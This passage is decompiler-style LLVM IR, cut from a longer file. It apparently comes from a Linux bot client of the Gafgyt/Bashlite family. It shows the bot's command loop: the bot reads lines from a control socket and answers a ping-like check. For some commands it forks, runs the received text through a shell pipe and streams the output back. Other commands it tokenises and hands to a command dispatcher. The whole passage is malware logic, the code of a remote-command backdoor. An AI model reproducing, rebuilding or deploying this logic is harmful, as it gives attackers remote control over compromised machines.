  %v2_80505bb = load i32, i32* %v1_80505bb, align 4
  %v2_80505bd = inttoptr i32 %v1_80505a8 to i32*
  store i32 %v2_80505bb, i32* %v2_80505bd, align 4
  %v4_80505bf = add i32 %storemerge16, 1
  br label %dec_label_pc_80505c2

dec_label_pc_80505c2:                             ; preds = %dec_label_pc_805058f, %dec_label_pc_8050598
  %storemerge16 = phi i32 [ %v4_80505bf, %dec_label_pc_8050598 ], [ %.pre, %dec_label_pc_805058f ]
  %v0_80505d6 = load i32, i32* @global_var_805b548.34, align 8
  %v0_80505dc = load i32, i32* @global_var_805b54c.35, align 4
  %v10_80505f4 = icmp eq i32 %v0_80505dc, 0
  br i1 %v10_80505f4, label %dec_label_pc_80505fc, label %dec_label_pc_8050598

dec_label_pc_80505fc:                             ; preds = %dec_label_pc_80505c2
  store i32 0, i32* @esi, align 4
  store i32 %v0_80505d6, i32* @edi, align 4
  %v10_8050610 = icmp ult i32 %storemerge16, %v0_80505d6
  br i1 %v10_8050610, label %dec_label_pc_8050598, label %dec_label_pc_8050618

dec_label_pc_8050618:                             ; preds = %dec_label_pc_80505fc
  %v2_805061b = mul i32 %storemerge16, 4
  %v0_8050620 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_8050625 = add i32 %v2_805061b, -4
  %v1_8050628 = add i32 %v2_8050625, %v0_8050620
  %v1_805062b = inttoptr i32 %v1_8050628 to i32*
  store i32 0, i32* %v1_805062b, align 4
  %v0_8050631 = load i32, i32* @global_var_805b548.34, align 8
  %v0_8050636 = load i32, i32* @global_var_805b54c.35, align 4
  %v1_805063c = add i32 %v0_8050631, -1
  %v4_805063c = icmp ne i32 %v0_8050631, 0
  %v2_805063f = zext i1 %v4_805063c to i32
  %v3_805063f = add i32 %v0_8050636, -1
  %v4_805063f = add i32 %v3_805063f, %v2_805063f
  store i32 %v1_805063c, i32* @global_var_805b548.34, align 8
  store i32 %v4_805063f, i32* @global_var_805b54c.35, align 4
  %v2_805065c = mul i32 %v1_805063c, 4
  %v1_805065f = add i32 %v2_805065c, 4
  %v5_805065f = icmp eq i32 %v2_805065c, -4
  store i1 %v5_805065f, i1* %cf.global-to-local, align 1
  store i32 %v1_805065f, i32* %stack_var_-5888, align 4
  %v1_8050665 = call i32 @malloc(i32 %v1_805065f)
  br label %dec_label_pc_8050698

dec_label_pc_8050676:                             ; preds = %dec_label_pc_8050698, %dec_label_pc_80506d2
  %v2_8050679 = mul i32 %storemerge15, 4
  %v5_805067e = add i32 %v2_8050679, %v1_8050665
  %v0_8050689 = load i32, i32* @global_var_80617d4.36, align 4
  %v2_805068e = add i32 %v0_8050689, %v2_8050679
  %v1_8050691 = inttoptr i32 %v2_805068e to i32*
  %v2_8050691 = load i32, i32* %v1_8050691, align 4
  %v2_8050693 = inttoptr i32 %v5_805067e to i32*
  store i32 %v2_8050691, i32* %v2_8050693, align 4
  %v4_8050695 = add i32 %storemerge15, 1
  br label %dec_label_pc_8050698

dec_label_pc_8050698:                             ; preds = %dec_label_pc_8050618, %dec_label_pc_8050676
  %storemerge15 = phi i32 [ %v4_8050695, %dec_label_pc_8050676 ], [ 0, %dec_label_pc_8050618 ]
  %v0_80506ac = load i32, i32* @global_var_805b548.34, align 8
  %v0_80506b2 = load i32, i32* @global_var_805b54c.35, align 4
  %v10_80506ca = icmp eq i32 %v0_80506b2, 0
  br i1 %v10_80506ca, label %dec_label_pc_80506d2, label %dec_label_pc_8050676

dec_label_pc_80506d2:                             ; preds = %dec_label_pc_8050698
  store i32 0, i32* @esi, align 4
  store i32 %v0_80506ac, i32* @edi, align 4
  %v10_80506e6 = icmp ult i32 %storemerge15, %v0_80506ac
  br i1 %v10_80506e6, label %dec_label_pc_8050676, label %dec_label_pc_80506ee

dec_label_pc_80506ee:                             ; preds = %dec_label_pc_80506d2
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_80506ee = load i32, i32* @global_var_80617d4.36, align 4
  store i32 %v0_80506ee, i32* %stack_var_-5888, align 4
  %v1_80506f6 = call i32 @free(i32 %v0_80506ee)
  store i32 %v1_8050665, i32* @global_var_80617d4.36, align 4
  br label %dec_label_pc_8050703

dec_label_pc_8050703:                             ; preds = %dec_label_pc_805055d, %dec_label_pc_80506ee
  br label %dec_label_pc_8050706

dec_label_pc_8050706:                             ; preds = %dec_label_pc_8050bab, %dec_label_pc_8050703
  %storemerge14 = phi i32 [ %.pre, %dec_label_pc_8050703 ], [ 0, %dec_label_pc_8050bab ]
  %v1_805070f = ashr i32 %storemerge14, 31
  %v0_8050716 = load i32, i32* @global_var_805b548.34, align 8
  store i32 %v0_8050716, i32* @esi, align 4
  %v0_805071c = load i32, i32* @global_var_805b54c.35, align 4
  store i32 %v0_805071c, i32* @edi, align 4
  %v10_8050734 = icmp ult i32 %v1_805070f, %v0_805071c
  store i1 %v10_8050734, i1* %cf.global-to-local, align 1
  br i1 %v10_8050734, label %dec_label_pc_805055d, label %dec_label_pc_8050740

dec_label_pc_8050740:                             ; preds = %dec_label_pc_8050706
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_805074c = icmp ugt i32 %v1_805070f, %v0_805071c
  br i1 %v6_805074c, label %dec_label_pc_8050760, label %dec_label_pc_805074e

dec_label_pc_805074e:                             ; preds = %dec_label_pc_8050740
  %v10_8050754 = icmp ult i32 %storemerge14, %v0_8050716
  store i1 %v10_8050754, i1* %cf.global-to-local, align 1
  br i1 %v10_8050754, label %dec_label_pc_805055d, label %dec_label_pc_8050760

dec_label_pc_8050760:                             ; preds = %dec_label_pc_805074e, %dec_label_pc_8050740
  %v0_8050763 = load i32, i32* @ebp, align 4
  %v2_8050763 = add i32 %v5_8050bc6, -5736
  %v3_8050763 = add i32 %v2_8050763, %v0_8050763
  %v4_8050763 = inttoptr i32 %v3_8050763 to i8*
  store i8 0, i8* %v4_8050763, align 1
  store i32 %v2_8050bab, i32* %stack_var_-5888, align 4
  %v2_8050774 = call i32 @trim(i8* %tmp121)
  store i32 %v2_8050bab, i32* %stack_var_-5888, align 4
  %v4_805078a = call i32 @strstr(i32 %v2_8050bab, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058457.21, i32 0, i32 0))
  %v7_8050797 = icmp ult i32 %v4_805078a, %v2_8050bab
  store i1 %v7_8050797, i1* %cf.global-to-local, align 1
  %v12_8050797 = icmp eq i32 %v4_805078a, %v2_8050bab
  %v1_8050799 = icmp eq i1 %v12_8050797, false
  br i1 %v1_8050799, label %dec_label_pc_80507b5, label %dec_label_pc_805079b

dec_label_pc_805079b:                             ; preds = %dec_label_pc_8050760
  %v0_805079b = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_805079b, i32* %stack_var_-5888, align 4
  %v3_80507ab = call i32 @sockprintf(i32 %v0_805079b, i32 ptrtoint ([5 x i8]* @global_var_8059672.450 to i32))
  br label %dec_label_pc_8050bab

dec_label_pc_80507b5:                             ; preds = %dec_label_pc_8050760
  store i32 %v2_8050bab, i32* %stack_var_-5888, align 4
  %v4_80507c6 = call i32 @strstr(i32 %v2_8050bab, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059677.451, i32 0, i32 0))
  store i32 %v4_80507c6, i32* @edx, align 4
  %v7_80507d3 = icmp ult i32 %v4_80507c6, %v2_8050bab
  store i1 %v7_80507d3, i1* %cf.global-to-local, align 1
  %v12_80507d3 = icmp eq i32 %v4_80507c6, %v2_8050bab
  %v1_80507d5 = icmp eq i1 %v12_80507d3, false
  br i1 %v1_80507d5, label %dec_label_pc_80507fd, label %dec_label_pc_80507d7

dec_label_pc_80507d7:                             ; preds = %dec_label_pc_80507b5
  %v4_80507d7 = add i32 %stack_var_-96.2.ph, 1
  store i32 ptrtoint ([20 x i8]* @global_var_805967b.452 to i32), i32* %stack_var_-5888, align 4
  %v1_80507e2 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_805967b.452 to i32))
  store i32 %v1_80507e2, i32* @eax, align 4
  %v9_80507e7 = icmp ult i32 %v4_80507d7, 20
  store i1 %v9_80507e7, i1* %cf.global-to-local, align 1
  %v7_80507eb = icmp sgt i32 %v4_80507d7, 20
  br i1 %v7_80507eb, label %dec_label_pc_80507f1, label %dec_label_pc_80504f5.outer

dec_label_pc_80507f1:                             ; preds = %dec_label_pc_80507d7
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_80507f8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80507fd

dec_label_pc_80507fd:                             ; preds = %dec_label_pc_80507b5, %dec_label_pc_80507f1
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph, %dec_label_pc_80507b5 ], [ %v4_80507d7, %dec_label_pc_80507f1 ]
  %v2_8050809 = load i8, i8* %tmp121, align 4
  %v6_805080c = icmp ult i8 %v2_8050809, 33
  store i1 %v6_805080c, i1* %cf.global-to-local, align 1
  %v10_805080c = icmp eq i8 %v2_8050809, 33
  %v1_805080e = icmp eq i1 %v10_805080c, false
  br i1 %v1_805080e, label %dec_label_pc_8050bab.outer, label %dec_label_pc_8050814

dec_label_pc_8050814:                             ; preds = %dec_label_pc_80507fd
  %v2_8050823128 = load i8, i8* %storemerge13127, align 1
  %v3_8050826131 = icmp ult i8 %v2_8050823128, 32
  store i1 %v3_8050826131, i1* %cf.global-to-local, align 1
  %v7_8050826135 = icmp eq i8 %v2_8050823128, 32
  br i1 %v7_8050826135, label %dec_label_pc_8050834, label %dec_label_pc_805082a

dec_label_pc_805081d:                             ; preds = %dec_label_pc_805082a
  %v5_805081d = add i32 %storemerge13.in137, 1
  %storemerge13 = inttoptr i32 %v5_805081d to i8*
  %v2_8050823 = load i8, i8* %storemerge13, align 1
  %v3_8050826 = icmp ult i8 %v2_8050823, 32
  store i1 %v3_8050826, i1* %cf.global-to-local, align 1
  %v7_8050826 = icmp eq i8 %v2_8050823, 32
  br i1 %v7_8050826, label %dec_label_pc_8050834, label %dec_label_pc_805082a

dec_label_pc_805082a:                             ; preds = %dec_label_pc_8050814, %dec_label_pc_805081d
  %storemerge13138 = phi i8* [ %storemerge13, %dec_label_pc_805081d ], [ %storemerge13127, %dec_label_pc_8050814 ]
  %storemerge13.in137 = phi i32 [ %v5_805081d, %dec_label_pc_805081d ], [ %v1_8050817, %dec_label_pc_8050814 ]
  %v2_805082d = load i8, i8* %storemerge13138, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050830 = icmp eq i8 %v2_805082d, 0
  %v1_8050832 = icmp eq i1 %v4_8050830, false
  br i1 %v1_8050832, label %dec_label_pc_805081d, label %dec_label_pc_8050834

dec_label_pc_8050834:                             ; preds = %dec_label_pc_805081d, %dec_label_pc_805082a, %dec_label_pc_8050814
  %storemerge13.lcssa = phi i8* [ %storemerge13127, %dec_label_pc_8050814 ], [ %storemerge13138, %dec_label_pc_805082a ], [ %storemerge13, %dec_label_pc_805081d ]
  %v2_8050837 = load i8, i8* %storemerge13.lcssa, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805083a = icmp eq i8 %v2_8050837, 0
  br i1 %v4_805083a, label %dec_label_pc_8050bab.outer, label %dec_label_pc_8050842

dec_label_pc_8050842:                             ; preds = %dec_label_pc_8050834
  store i8 0, i8* %storemerge13.lcssa, align 1
  %v3_8050866 = call i32 @_strlen(i8* %storemerge13127)
  %v6_805086d = add i32 %v2_8050bab, %v3_8050866
  %v1_8050870 = add i32 %v6_805086d, 2
  %v5_8050870 = icmp ugt i32 %v6_805086d, -3
  store i1 %v5_8050870, i1* %cf.global-to-local, align 1
  %v5_8050873 = inttoptr i32 %v1_8050870 to i8*
  br label %dec_label_pc_805089d

dec_label_pc_8050878:                             ; preds = %dec_label_pc_80508c6, %dec_label_pc_805089d
  %v3_805088f = call i32 @_strlen(i8* %v5_8050873)
  %v4_805088f = mul i32 %v3_805088f, -1
  %v1_8050895 = sub i32 0, %v4_805088f
  %v6_8050896 = sub i32 %v1_8050870, %v4_805088f
  %v11_8050896 = icmp ult i32 %v6_8050896, %v1_8050895
  store i1 %v11_8050896, i1* %cf.global-to-local, align 1
  %v1_8050899 = add i32 %v6_8050896, -1
  %v1_805089a = inttoptr i32 %v1_8050899 to i8*
  store i8 0, i8* %v1_805089a, align 1
  br label %dec_label_pc_805089d

dec_label_pc_805089d:                             ; preds = %dec_label_pc_8050842, %dec_label_pc_8050878
  %v3_80508b4 = call i32 @_strlen(i8* %v5_8050873)
  %v4_80508b4 = mul i32 %v3_80508b4, -1
  %v1_80508ba = sub i32 0, %v4_80508b4
  %v6_80508bb = sub i32 %v1_8050870, %v4_80508b4
  %v11_80508bb = icmp ult i32 %v6_80508bb, %v1_80508ba
  store i1 %v11_80508bb, i1* %cf.global-to-local, align 1
  %v1_80508be = add i32 %v6_80508bb, -1
  %v1_80508bf = inttoptr i32 %v1_80508be to i8*
  %v2_80508bf = load i8, i8* %v1_80508bf, align 1
  %v6_80508c2 = icmp ult i8 %v2_80508bf, 10
  store i1 %v6_80508c2, i1* %cf.global-to-local, align 1
  %v10_80508c2 = icmp eq i8 %v2_80508bf, 10
  br i1 %v10_80508c2, label %dec_label_pc_8050878, label %dec_label_pc_80508c6

dec_label_pc_80508c6:                             ; preds = %dec_label_pc_805089d
  %v3_80508dd = call i32 @_strlen(i8* %v5_8050873)
  %v4_80508dd = mul i32 %v3_80508dd, -1
  %v1_80508e3 = sub i32 0, %v4_80508dd
  %v6_80508e4 = sub i32 %v1_8050870, %v4_80508dd
  %v11_80508e4 = icmp ult i32 %v6_80508e4, %v1_80508e3
  store i1 %v11_80508e4, i1* %cf.global-to-local, align 1
  %v1_80508e7 = add i32 %v6_80508e4, -1
  %v1_80508e8 = inttoptr i32 %v1_80508e7 to i8*
  %v2_80508e8 = load i8, i8* %v1_80508e8, align 1
  %v6_80508eb = icmp ult i8 %v2_80508e8, 13
  store i1 %v6_80508eb, i1* %cf.global-to-local, align 1
  %v10_80508eb = icmp eq i8 %v2_80508e8, 13
  br i1 %v10_80508eb, label %dec_label_pc_8050878, label %dec_label_pc_80508ef

dec_label_pc_80508ef:                             ; preds = %dec_label_pc_80508c6
  %v2_80508fd143 = load i8, i8* %v5_8050873, align 1
  %v3_8050900146 = icmp ult i8 %v2_80508fd143, 32
  store i1 %v3_8050900146, i1* %cf.global-to-local, align 1
  %v7_8050900150 = icmp eq i8 %v2_80508fd143, 32
  br i1 %v7_8050900150, label %dec_label_pc_805090e, label %dec_label_pc_8050904

dec_label_pc_80508f7:                             ; preds = %dec_label_pc_8050904
  %v5_80508f7 = add i32 %v4_80508fa153, 1
  %v22_80508f7 = inttoptr i32 %v5_80508f7 to i8*
  %v2_80508fd = load i8, i8* %v22_80508f7, align 1
  %v3_8050900 = icmp ult i8 %v2_80508fd, 32
  store i1 %v3_8050900, i1* %cf.global-to-local, align 1
  %v7_8050900 = icmp eq i8 %v2_80508fd, 32
  br i1 %v7_8050900, label %dec_label_pc_805090e, label %dec_label_pc_8050904

dec_label_pc_8050904:                             ; preds = %dec_label_pc_80508ef, %dec_label_pc_80508f7
  %v4_80508fa153 = phi i32 [ %v5_80508f7, %dec_label_pc_80508f7 ], [ %v1_8050870, %dec_label_pc_80508ef ]
  %stack_var_-64.0152 = phi i8* [ %v22_80508f7, %dec_label_pc_80508f7 ], [ %v5_8050873, %dec_label_pc_80508ef ]
  %v2_8050907 = load i8, i8* %stack_var_-64.0152, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805090a = icmp eq i8 %v2_8050907, 0
  %v1_805090c = icmp eq i1 %v4_805090a, false
  br i1 %v1_805090c, label %dec_label_pc_80508f7, label %dec_label_pc_805090e

dec_label_pc_805090e:                             ; preds = %dec_label_pc_80508f7, %dec_label_pc_8050904, %dec_label_pc_80508ef
  %stack_var_-64.0.lcssa = phi i8* [ %v5_8050873, %dec_label_pc_80508ef ], [ %stack_var_-64.0152, %dec_label_pc_8050904 ], [ %v22_80508f7, %dec_label_pc_80508f7 ]
  %v4_80508fa.lcssa = phi i32 [ %v1_8050870, %dec_label_pc_80508ef ], [ %v4_80508fa153, %dec_label_pc_8050904 ], [ %v5_80508f7, %dec_label_pc_80508f7 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v5_8050914 = add i32 %v4_80508fa.lcssa, 1
  %v2_805093d159 = load i8, i8* %v5_8050873, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050940161 = icmp eq i8 %v2_805093d159, 0
  %v1_8050942163 = icmp eq i1 %v4_8050940161, false
  br i1 %v1_8050942163, label %dec_label_pc_805091f, label %dec_label_pc_8050944

dec_label_pc_805091f:                             ; preds = %dec_label_pc_805090e, %dec_label_pc_805091f
  %storemerge12165 = phi i8* [ %storemerge12, %dec_label_pc_805091f ], [ %v5_8050873, %dec_label_pc_805090e ]
  %storemerge12.in164 = phi i32 [ %v5_8050937, %dec_label_pc_805091f ], [ %v1_8050870, %dec_label_pc_805090e ]
  %v2_8050922 = load i8, i8* %storemerge12165, align 1
  %v3_8050922 = zext i8 %v2_8050922 to i32
  store i32 %v3_8050922, i32* %stack_var_-5888, align 4
  %v1_805092b = call i32 @__GI_toupper(i32 %v3_8050922)
  %v1_8050930 = urem i32 %v1_805092b, 256
  %v2_8050930 = load i32, i32* @edx, align 4
  %v3_8050930 = and i32 %v2_8050930, -256
  %v4_8050930 = or i32 %v3_8050930, %v1_8050930
  store i32 %v4_8050930, i32* @edx, align 4
  %v1_8050935 = trunc i32 %v1_805092b to i8
  store i8 %v1_8050935, i8* %storemerge12165, align 1
  %v5_8050937 = add i32 %storemerge12.in164, 1
  %storemerge12 = inttoptr i32 %v5_8050937 to i8*
  %v2_805093d = load i8, i8* %storemerge12, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050940 = icmp eq i8 %v2_805093d, 0
  %v1_8050942 = icmp eq i1 %v4_8050940, false
  br i1 %v1_8050942, label %dec_label_pc_805091f, label %dec_label_pc_8050944

dec_label_pc_8050944:                             ; preds = %dec_label_pc_805091f, %dec_label_pc_805090e
  store i1 false, i1* @df, align 1
  store i32 %v1_8050870, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805968f.453 to i32), i32* @edi, align 4
  %v7_8050974 = call i32 @_strncmp(i8* %v5_8050873, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805968f.453, i32 0, i32 0), i32 3)
  %v8_8050974 = urem i32 %v7_8050974, 2
  %v9_8050974 = icmp eq i32 %v8_8050974, 0
  %v0_8050976 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050976 = or i1 %v0_8050976, %v9_8050974
  %v3_8050976 = zext i1 %v2_8050976 to i32
  %v4_8050976 = load i32, i32* @edx, align 4
  %v5_8050976 = and i32 %v4_8050976, -256
  %v6_8050976 = or i32 %v3_8050976, %v5_8050976
  %v7_8050976 = xor i32 %v6_8050976, 1
  store i32 %v7_8050976, i32* @edx, align 4
  %v3_805097c = and i32 %v7_8050974, -256
  %v1_805097e = trunc i32 %v7_8050976 to i8
  %v3_805097e = zext i1 %v0_8050976 to i8
  %v4_805097e = sub nsw i8 %v1_805097e, %v3_805097e
  %v15_805097e = icmp eq i8 %v4_805097e, 0
  %v20_805097e = zext i8 %v4_805097e to i32
  %v23_805097e = or i32 %v20_805097e, %v3_805097c
  store i32 %v23_805097e, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050987 = icmp eq i1 %v15_805097e, false
  br i1 %v1_8050987, label %dec_label_pc_8050a88, label %dec_label_pc_805098d

dec_label_pc_805098d:                             ; preds = %dec_label_pc_8050944
  %v0_805098d = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050992 = icmp eq i32 %v0_805098d, 0
  %v1_8050994 = icmp eq i1 %v1_8050992, false
  br i1 %v1_8050994, label %dec_label_pc_8050bab.outer, label %dec_label_pc_805099a

dec_label_pc_805099a:                             ; preds = %dec_label_pc_805098d
  store i32 %v2_805099a, i32* %stack_var_-5888, align 4
  %v5_80509b6 = call i32 @__GI_memset(i8* %v4_80509b6, i32 0, i32 1024)
  store i32 %v2_805099a, i32* %stack_var_-5888, align 4
  %v4_80509d4 = call i32 @szprintf(i32 %v2_805099a, i32 ptrtoint ([8 x i8]* @global_var_8059692.454 to i32), i32 %v5_8050914)
  store i32 %v2_805099a, i32* %stack_var_-5888, align 4
  %v4_80509eb = call i32 @fdpopen(i32 %v2_805099a, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805963e.443, i32 0, i32 0))
  store i32 %v2_805099a, i32* %stack_var_-5888, align 4
  %v4_8050a68166 = call i32 @fdgets(i32 %v2_805099a, i32 1024, i32 %v4_80509eb)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a6d167 = icmp eq i32 %v4_8050a68166, 0
  %v1_8050a6f169 = icmp eq i1 %v1_8050a6d167, false
  br i1 %v1_8050a6f169, label %dec_label_pc_80509f5, label %dec_label_pc_8050a71

dec_label_pc_80509f5:                             ; preds = %dec_label_pc_805099a, %dec_label_pc_80509f5
  store i32 %v2_805099a, i32* %stack_var_-5888, align 4
  %v2_80509fe = call i32 @trim(i8* %v4_80509b6)
  %v0_8050a03 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_8050a03, i32* %stack_var_-5888, align 4
  %v3_8050a1e = call i32 @sockprintf(i32 %v0_8050a03, i32 ptrtoint ([3 x i8]* @global_var_805969a.455 to i32))
  store i32 %v2_805099a, i32* %stack_var_-5888, align 4
  %v5_8050a3f = call i32 @__GI_memset(i8* %v4_80509b6, i32 0, i32 1024)
  store i32 1, i32* %stack_var_-5888, align 4
  %v1_8050a4b = call i32 @sleep(i32 1)
  store i32 %v2_805099a, i32* %stack_var_-5888, align 4
  %v4_8050a68 = call i32 @fdgets(i32 %v2_805099a, i32 1024, i32 %v4_80509eb)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a6d = icmp eq i32 %v4_8050a68, 0
  %v1_8050a6f = icmp eq i1 %v1_8050a6d, false
  br i1 %v1_8050a6f, label %dec_label_pc_80509f5, label %dec_label_pc_8050a71

dec_label_pc_8050a71:                             ; preds = %dec_label_pc_80509f5, %dec_label_pc_805099a
  store i32 %v4_80509eb, i32* %stack_var_-5888, align 4
  %v1_8050a77 = call i32 @fdpclose(i32 %v4_80509eb)
  store i32 %v1_8050a77, i32* @eax, align 4
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_8050a83 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8050a88

dec_label_pc_8050a88:                             ; preds = %dec_label_pc_8050944, %dec_label_pc_8050a71
  store i32 %v5_8050914, i32* @eax, align 4
  store i32 %v5_8050914, i32* %stack_var_-5888, align 4
  %v3_8050a9d = call i32 @__GI_strtok(i32 %v5_8050914, i32 ptrtoint (i32* @global_var_805969d.456 to i32))
  %v5_8050aa2 = inttoptr i32 %v3_8050a9d to i8*
  store i8* %v5_8050aa2, i8** %stack_var_-36, align 4
  store i32 %v1_8050870, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8050b5934 = icmp eq i32 %v3_8050a9d, 0
  %v1_8050b5d41 = icmp eq i1 %v5_8050b5934, false
  br i1 %v1_8050b5d41, label %dec_label_pc_8050ab3, label %dec_label_pc_8050b63

dec_label_pc_8050ab3:                             ; preds = %dec_label_pc_8050a88, %dec_label_pc_8050b42
  %v3_8050ac4 = phi i8* [ %tmp124, %dec_label_pc_8050b42 ], [ %v5_8050aa2, %dec_label_pc_8050a88 ]
  %stack_var_-40.142 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8050b42 ], [ 1, %dec_label_pc_8050a88 ]
  %v2_8050ab6 = load i8, i8* %v3_8050ac4, align 1
  %v3_8050ab6 = zext i8 %v2_8050ab6 to i32
  store i32 %v3_8050ab6, i32* @eax, align 4
  %v6_8050ab9 = icmp ult i8 %v2_8050ab6, 10
  store i1 %v6_8050ab9, i1* %cf.global-to-local, align 1
  %v10_8050ab9 = icmp eq i8 %v2_8050ab6, 10
  br i1 %v10_8050ab9, label %dec_label_pc_8050b42, label %dec_label_pc_8050ac1

dec_label_pc_8050ac1:                             ; preds = %dec_label_pc_8050ab3
  %v4_8050ab3 = ptrtoint i8* %v3_8050ac4 to i32
  store i32 %stack_var_-40.142, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050ab3, i32* @edi, align 4
  %v3_8050adb = call i32 @_strlen(i8* %v3_8050ac4)
  %v1_8050adf = add i32 %v3_8050adb, 1
  store i32 %v1_8050adf, i32* %stack_var_-5888, align 4
  %v1_8050ae6 = call i32 @malloc(i32 %v1_8050adf)
  %v1_8050aeb = load i32, i32* @ebp, align 4
  %v2_8050aeb = load i32, i32* @ebx, align 4
  %v3_8050aeb = mul i32 %v2_8050aeb, 4
  %v4_8050aeb = add i32 %v1_8050aeb, -616
  %v5_8050aeb = add i32 %v4_8050aeb, %v3_8050aeb
  %v6_8050aeb = inttoptr i32 %v5_8050aeb to i32*
  store i32 %v1_8050ae6, i32* %v6_8050aeb, align 4
  %v3_8050af2 = load i8*, i8** %stack_var_-36, align 4
  %v4_8050af2 = ptrtoint i8* %v3_8050af2 to i32
  %v3_8050b09 = call i32 @_strlen(i8* %v3_8050af2)
  %v1_8050b0d = add i32 %v3_8050b09, 1
  %v0_8050b16 = load i32, i32* @ebp, align 4
  %v2_8050b16 = mul i32 %stack_var_-40.142, 4
  %v3_8050b16 = add i32 %v2_8050b16, -616
  %v4_8050b16 = add i32 %v0_8050b16, %v3_8050b16
  %v5_8050b16 = inttoptr i32 %v4_8050b16 to i32*
  %v6_8050b16 = load i32, i32* %v5_8050b16, align 4
  %v1_8050b1d = inttoptr i32 %v6_8050b16 to i8*
  store i32 %v6_8050b16, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8050b22 = and i32 %v6_8050b16, -256
  %v5_8050b24 = call i8* @_memset(i8* %v1_8050b1d, i32 %v1_8050b22, i32 %v1_8050b0d)
  %v6_8050b24 = ptrtoint i8* %v5_8050b24 to i32
  store i32 %v6_8050b24, i32* @ecx, align 4
  %v0_8050b2c = load i32, i32* @ebp, align 4
  %v4_8050b2c = add i32 %v0_8050b2c, %v3_8050b16
  %v5_8050b2c = inttoptr i32 %v4_8050b2c to i32*
  %v6_8050b2c = load i32, i32* %v5_8050b2c, align 4
  store i32 %v6_8050b2c, i32* @eax, align 4
  store i32 %v6_8050b2c, i32* %stack_var_-5888, align 4
  %v3_8050b3a = inttoptr i32 %v6_8050b2c to i8*
  %v4_8050b3a = call i32 @strcpy(i8* %v3_8050b3a, i32 %v4_8050af2)
  store i32 %v4_8050b3a, i32* @eax, align 4
  %v4_8050b3f = add i32 %stack_var_-40.142, 1
  br label %dec_label_pc_8050b42

dec_label_pc_8050b42:                             ; preds = %dec_label_pc_8050ab3, %dec_label_pc_8050ac1
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.142, %dec_label_pc_8050ab3 ], [ %v4_8050b3f, %dec_label_pc_8050ac1 ]
  store i32 0, i32* %stack_var_-5888, align 4
  %v3_8050b51 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805969d.456 to i32))
  store i32 %v3_8050b51, i32* %tmp122, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_8050b59 = icmp eq i32 %v3_8050b51, 0
  %v1_8050b5d = icmp eq i1 %v5_8050b59, false
  %tmp124 = inttoptr i32 %v3_8050b51 to i8*
  br i1 %v1_8050b5d, label %dec_label_pc_8050ab3, label %dec_label_pc_8050b63

dec_label_pc_8050b63:                             ; preds = %dec_label_pc_8050b42, %dec_label_pc_8050a88
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_8050a88 ], [ %stack_var_-40.0, %dec_label_pc_8050b42 ]
  store i32 %stack_var_-40.1.lcssa, i32* %stack_var_-5888, align 4
  %v4_8050b73 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v9_8050b78 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_8050b78, i1* %cf.global-to-local, align 1
  %v7_8050b7c = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_8050b7c, label %dec_label_pc_8050b8e.lr.ph, label %dec_label_pc_8050bab.outer

dec_label_pc_8050b8e.lr.ph:                       ; preds = %dec_label_pc_8050b63
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050b8e

dec_label_pc_8050b8e:                             ; preds = %dec_label_pc_8050b8e.lr.ph, %dec_label_pc_8050b8e
  %storemerge179 = phi i32 [ 1, %dec_label_pc_8050b8e.lr.ph ], [ %v4_8050ba0, %dec_label_pc_8050b8e ]
  %v0_8050b91 = load i32, i32* @ebp, align 4
  %v2_8050b91 = mul i32 %storemerge179, 4
  %v3_8050b91 = add i32 %v2_8050b91, -616
  %v4_8050b91 = add i32 %v3_8050b91, %v0_8050b91
  %v5_8050b91 = inttoptr i32 %v4_8050b91 to i32*
  %v6_8050b91 = load i32, i32* %v5_8050b91, align 4
  store i32 %v6_8050b91, i32* %stack_var_-5888, align 4
  %v1_8050b9b = call i32 @free(i32 %v6_8050b91)
  %v4_8050ba0 = add nuw i32 %storemerge179, 1
  %v10_8050ba6 = icmp ult i32 %v4_8050ba0, %stack_var_-40.1.lcssa
  store i1 %v10_8050ba6, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8050ba0, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_8050bab.outer, label %dec_label_pc_8050b8e

